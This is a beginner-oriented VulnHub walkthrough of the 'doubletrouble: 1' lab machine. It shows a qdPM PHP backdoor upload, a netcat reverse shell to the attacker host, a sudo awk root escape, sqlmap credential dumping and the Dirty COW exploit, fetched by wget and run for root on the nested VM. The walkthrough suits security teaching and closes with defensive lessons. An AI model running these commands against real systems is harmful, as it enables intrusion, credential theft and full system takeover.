# doubletrouble: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational boot2root walkthrough for students. Everything here is performed on
> an isolated lab network against a machine you intentionally downloaded to attack.
> Never point these techniques at systems you do not own or have written permission to test.

| Field | Value |
| --- | --- |
| **Machine** | doubletrouble: 1 |
| **Difficulty** | Easy (author labels it medium; it has a nested second VM) |
| **Author** | tasiyanci |
| **Released** | 11 September 2021 |
| **VulnHub Entry** | [https://vulnhub.com/entry/doubletrouble-1,743/](https://vulnhub.com/entry/doubletrouble-1,743/) |
| **Download** | [https://vulnhub.com/entry/doubletrouble-1,743/#download](https://vulnhub.com/entry/doubletrouble-1,743/#download) (mirror: `https://download.vulnhub.com/doubletrouble/doubletrouble.ova`, ~979 MB) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) on a host-only network |
| **Target OS** | Linux (Debian/Ubuntu; outer = qdPM on Apache/PHP, inner = Debian 3.2 kernel) |

> **Why the name:** the outer VM is only half the challenge. Once you root it you find a
> *second* VM (an OVA) in `/root` — the "double" trouble. You must import and root that
> one too to reach the final flag.
>
> **Note:** exact IPs, paths, and flags **vary by build**. Where you see `192.168.56.101`,
> substitute whatever address *your* target gets from DHCP. The inner VM will get its own
> address (e.g. `192.168.56.103`).

---

## 0. What you will learn

- How to find a live target with `netdiscover` / `arp-scan`.
- How to recognise a **qdPM** web application and enumerate it with `gobuster`.
- How to exploit a **config-file leak** (`/core/config/databases.yml`) for DB credentials.
- How to extract **steganographically hidden** data from an image with `stegseek`.
- How to use leaked credentials to log in and abuse a **qdPM 9.1 authenticated RCE**.
- How to get a reverse shell and upgrade it to a full TTY.
- How to escalate with `sudo awk` (GTFOBins) to root the outer VM.
- How to pivot into a **nested inner VM**, find **SQL injection**, and root it with
  **Dirty COW** (CVE-2016-5195).

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to import
an OVA, and be comfortable in a Linux shell.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP>
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** the host-only adapter (`eth0`) is on `192.168.56.x`; the target VM is
> on the **same** subnet, so a subnet scan will reveal it.

```bash
sudo netdiscover -r 192.168.56.0/24
# or:
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   (Kali)
192.168.56.101  (target)
```

> **How to read it:** the host that is not your Kali box is the target — here
> `192.168.56.101`.

**Target IP:** `192.168.56.101`

![Finding the target with netdiscover](images/01-recon.png)

---

## 2. Enumeration

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.x ((Ubuntu))
|_http-title: qdPM | Login
```

> **How to read it:** only two ports. The web title says **qdPM** — a known project-management
> app that has had several exploits. That name is the single biggest clue on the box.

### 2.1 Directory brute-force with gobuster

```bash
gobuster dir -u http://192.168.56.101/ \
  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
  -x .php,.txt,.bak,.zip -t 50
```

```text
/index.php            (Status: 200)
/core                 (Status: 301)
/secret               (Status: 301)
/uploads              (Status: 301)  <-- directory listing enabled
/install              (Status: 301)
/sf                   (Status: 301)
```

> **Why it works:** `gobuster` requests each word in the list as a path and reports the
> HTTP status. `301`/`200` responses reveal real directories. Two jump out: **`/secret`**
> and **`/uploads`** (with *directory listing* on, so you can browse filenames).

![gobuster results](images/02-gobuster.png)

### 2.2 Two leaks: config file and a secret image

qdPM is built on Symfony, which keeps DB credentials in a YAML file:

```bash
curl -s http://192.168.56.101/core/config/databases.yml
```

```text
all:
  doctrine:
    param:
      dsn: 'mysql:dbname=qdpm;host=localhost'
      username: otis
      password: "<?php echo urlencode('rush') ; ?>"
```

> **Why it works:** the config file is served by the web server, so anyone can read it. It
> leaks the DB username/password pattern (`otis` / `rush`), which is a great hint for later.

Browse `/secret/` for the image:

```bash
curl -s http://192.168.56.101/secret/
wget http://192.168.56.101/secret/doubletrouble.jpg
```

```text
doubletrouble.jpg
```

> **Why it works:** a lone `.jpg` parked in a web directory is a classic invitation to try
> **steganography** — hidden data buried inside a file that looks like a picture.

![Directory listing and config leak](images/03-enum.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Crack the hidden data in the image

Extract hidden data from the JPG. `stegseek` brute-forces the passphrase quickly.

```bash
stegseek doubletrouble.jpg /usr/share/wordlists/rockyou.txt
```

```text
[i] Found passphrase: "92camaro"
[i] Original filename: "creds.txt"
[i] Extracting to "doubletrouble.jpg.out"
```

```bash
cat doubletrouble.jpg.out
```

```text
otisrush@localhost.com
otis666
```

> **Why it works:** steganography hides data inside the pixels of an image. `stegseek`
> tries each word from `rockyou.txt` as the passphrase until the embedded payload decrypts
> cleanly. The payload is a **credential pair**: email `otisrush@localhost.com`, password
> `otis666`. (If `stegseek` is unavailable, `steghide` + `stegcracker` do the same job.)

### 3.2 Log in to qdPM

The login page asks for an **email** and a **password** — which is exactly what we recovered.

```text
URL:      http://192.168.56.101/index.php/login
Email:    otisrush@localhost.com
Password: otis666
```

> **Why it works:** the credentials hidden in the image are valid qdPM users. We are now
> authenticated into the application.

### 3.3 Exploit qdPM 9.1 authenticated RCE

qdPM 9.1 has an **authenticated remote code execution** flaw: the profile "upload image"
feature does not properly validate uploaded files, letting you upload a PHP web shell.

First find the exploit locally:

```bash
searchsploit qdPM
```

```text
qdPM 9.1 - Remote Code Execution (RCE) (Authenticated)   | php/webapps/50175.py
```

Run it (or simply upload a PHP shell through the profile's image upload in the browser):

```bash
python3 50175.py --host 'http://192.168.56.101/' \
  -u otisrush@localhost.com -p otis666
```

```text
Backdoor uploaded at ->
http://192.168.56.101/uploads/users/148232-backdoor.php?cmd=whoami
```

```bash
curl 'http://192.168.56.101/uploads/users/148232-backdoor.php?cmd=whoami'
```

```text
<pre>www-data
</pre>
```

> **Why it works:** the app stores uploaded files under `/uploads/users/` **without
> renaming to a safe extension**, so our `.php` file is executed by Apache as PHP. Passing
> `?cmd=` runs a shell command as the web user (`www-data`).

### 3.4 Get a reverse shell

On Kali, start a listener; then trigger a shell from the uploaded backdoor.

```bash
# Kali
nc -lvnp 443
```

```bash
# Trigger via curl (URL-encode the spaces)
curl 'http://192.168.56.101/uploads/users/148232-backdoor.php?cmd=nc%20192.168.56.10%20443%20-e%20/bin/bash'
```

```text
www-data@doubletrouble:/var/www/html/uploads/users$
```

> **Why it works:** `nc -e /bin/bash` makes the target connect **back** to our listener and
> hand us a shell. Because we initiated it *from the target*, it bypasses inbound firewalls.

Upgrade the dumb shell to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then on Kali:
stty raw -echo; fg
# then press Enter and:
export TERM=xterm
```

> **Why it works:** the raw shell has no job control or tab-completion. Spawning a PTY and
> resetting terminal modes gives us an interactive shell that behaves normally.

![Reverse shell as www-data](images/04-shell-wwwdata.png)

---

## 4. Privilege escalation — becoming root (twice)

### 4.1 Outer VM: abuse `sudo awk`

```bash
sudo -l
```

```text
User www-data may run the following commands on doubletrouble:
    (ALL : ALL) NOPASSWD: /usr/bin/awk
```

> **Why it works:** `www-data` can run **`/usr/bin/awk` as root with no password**. `awk`
> has a `system()` function that executes arbitrary shell commands — so we can make it run
> `bash`, and that `bash` inherits root. This is a well-known GTFOBins technique.

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

```text
root@doubletrouble:~# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** GTFOBins documents that `awk` can escape to a shell. Since the binary
> runs as root via sudo, the spawned shell is root.

![Escalating to root via sudo awk](images/05-privesc-awk.png)

### 4.2 The surprise: a second VM

Look in root's home directory — there is no flag, only an OVA:

```bash
ls -la /root
```

```text
doubletrouble.ova
```

> **Why it works:** the challenge ships a *nested* VM. To finish, copy the OVA into the
> web root and download it, then import it as a new VirtualBox VM.

```bash
cp /root/doubletrouble.ova /var/www/html/
chmod 644 /var/www/html/doubletrouble.ova
```

```bash
# On Kali
wget http://192.168.56.101/doubletrouble.ova
```

Then import the OVA in VirtualBox and power it on. Find its new address:

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
192.168.56.103  (inner "double trouble" VM)
```

![Downloading and importing the second VM](images/06-second-vm.png)

### 4.3 Inner VM: find SQL injection and get user creds

The inner VM's port 80 shows a small custom login form. Test the login parameter for
**SQL injection** (it is vulnerable to time-based injection against MySQL).

```bash
# Confirm the injection, then dump the database
sqlmap -u http://192.168.56.103/ --forms --dbms=mysql -p uname --current-db
sqlmap -u http://192.168.56.103/ --forms --dbms=mysql -p uname -D doubletrouble --tables
sqlmap -u http://192.168.56.103/ --forms --dbms=mysql -p uname -D doubletrouble -T users --dump
```

```text
Database: doubletrouble
Table: users
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | clapton  | ZubZub99 |
+----+----------+----------+
```

> **Why it works:** the login form concatenates user input straight into a SQL query.
> `sqlmap` detects this and automates extraction. We recover a real account: **clapton**.

### 4.4 Inner VM: SSH in and root with Dirty COW

```bash
ssh clapton@192.168.56.103
# password: ZubZub99
```

```text
clapton@doubletrouble:~$ id
uid=1000(clapton) gid=1000(clapton) ...
clapton@doubletrouble:~$ cat flag.txt
<user flag — varies by build>

clapton@doubletrouble:~$ uname -a
Linux doubletrouble 3.2.0-4-amd64 ... x86_64 GNU/Linux
```

> **Why it works:** the kernel is `3.2.0-4-amd64` (Debian) — vulnerable to **Dirty COW**
> (CVE-2016-5195), a race condition in the Linux copy-on-write handling of read-only
> memory that lets an unprivileged user write to files they should not be able to.

Compile and run the public exploit to create a new root-equivalent user:

```bash
# On the inner VM (or transfer the compiled binary)
wget http://192.168.56.10:8000/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```

```text
# creates/replaces user 'firefart' with a chosen password, UID 0
# (the original /etc/passwd is backed up, e.g. /tmp/passwd.bak)
```

Now log in as that new user (UID 0) over SSH:

```bash
ssh firefart@192.168.56.103
# password: (whatever you set, e.g. firefart)
```

```text
firefart@doubletrouble:~# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@doubletrouble:~# ls /root
root.txt
firefart@doubletrouble:~# cat /root/root.txt
<root flag — varies by build>
```

> **Why it works:** the exploit temporarily overwrites the on-disk `/etc/passwd` so a new
> account with **UID 0** (i.e. root by number, regardless of name) exists. Logging in as
> that account gives full root. Restore the original `passwd` afterwards.

![Rooting the inner VM with Dirty COW](images/07-privesc-dirtycow.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Sensitive config file exposed | `/core/config/databases.yml` | Leaks DB credentials (`otis`/`rush`) |
| 2 | Hidden credentials in image (steganography) | `/secret/doubletrouble.jpg` (`92camaro`) | Recovers qdPM login (`otisrush@localhost.com`/`otis666`) |
| 3 | Unrestricted file upload / qdPM 9.1 authenticated RCE | `/uploads/users/*.php` | Remote code execution as `www-data` |
| 4 | Over-broad sudo | `www-data` → `NOPASSWD: /usr/bin/awk` | Escalation to root (GTFOBins) |
| 5 | SQL injection (time-based) | Inner VM login form | Dumps `clapton`/`ZubZub99` |
| 6 | Outdated kernel — Dirty COW (CVE-2016-5195) | Inner VM `3.2.0-4-amd64` | Unprivileged local user becomes root |

## 6. Defensive lessons (blue team)

- **Never expose framework config files.** Block access to `/core/`, `databases.yml`, and
  similar; keep secrets out of the web root.
- **Validate uploads server-side.** Reject unexpected extensions/MIME types, store uploads
  **outside** the web root, and never execute them as code.
- **Strip metadata from published images.** Re-encode images and scan for embedded payloads
  before publishing.
- **Parameterise SQL queries.** Use prepared statements so user input is never treated as
  code — this kills the injection on the inner VM.
- **Enforce least privilege on `sudo`.** Granting `NOPASSWD: /usr/bin/awk` is equal to giving
  a root shell; allowlist only safe arguments, or none at all.
- **Patch the kernel.** Dirty COW was fixed in 2016; running `3.2.0` years later is the whole
  privesc. Track EOL and use unattended security updates.
- **Detection:** alert on new `.php` files under `uploads/`, web-server child processes
  spawning shells, and known exploit filenames (`dirty`, `firefart`).

---

## 7. References

- VulnHub entry: [doubletrouble: 1](https://vulnhub.com/entry/doubletrouble-1,743/)
- Community writeups consulted:
  - [DOUBLETROUBLE 1 CTF walkthrough, part 1 — Infosec Institute](https://www.infosecinstitute.com/resources/capture-the-flag/doubletrouble-1-vulnhub-ctf-walkthrough-part-1/)
  - [DOUBLETROUBLE 1 CTF walkthrough, part 2 — Infosec Institute](https://www.infosecinstitute.com/resources/capture-the-flag/doubletrouble-1-vulnhub-ctf-walkthrough-part-2/)
  - [Walkthrough: Vulnhub Doubletrouble — Mattia Zignale](https://www.mattiazignale.it/en/walkthrough-vulnhub-doubletrouble-english-version/)
  - [VulnHub DoubleTrouble Writeup — Tanveer Abdulaziz](https://firerey12.github.io/vulnhub/double-trouble)
  - [Doubletrouble 1 Walkthrough — Mridul Bhardwaj (Medium)](https://mridulbhardwajj.medium.com/doubletrouble-1-walkthrough-8810359abb37)
- Vendor advisories / docs:
  - [Exploit-DB — qdPM 9.1 RCE (50175)](https://www.exploit-db.com/exploits/50175)
  - [CVE-2016-5195 — Dirty COW](https://nvd.nist.gov/vuln/detail/CVE-2016-5195)
  - [Dirty COW PoC — FireFart](https://github.com/FireFart/dirtycow)
  - [GTFOBins — awk](https://gtfobins.github.io/gtfobins/awk/)
  - [StegSeek](https://github.com/RickdeJager/stegseek)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with netdiscover / arp-scan
- [ ] `images/02-gobuster.png` — Nmap + gobuster directory discovery
- [ ] `images/03-enum.png` — `databases.yml` leak and `/secret` image
- [ ] `images/04-shell-wwwdata.png` — qdPM RCE reverse shell as `www-data`
- [ ] `images/05-privesc-awk.png` — `sudo awk` escalation to root
- [ ] `images/06-second-vm.png` — downloading/importing the nested VM
- [ ] `images/07-privesc-dirtycow.png` — Dirty COW rooting the inner VM
- [ ] `images/08-root-flag.png` — reading the final root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
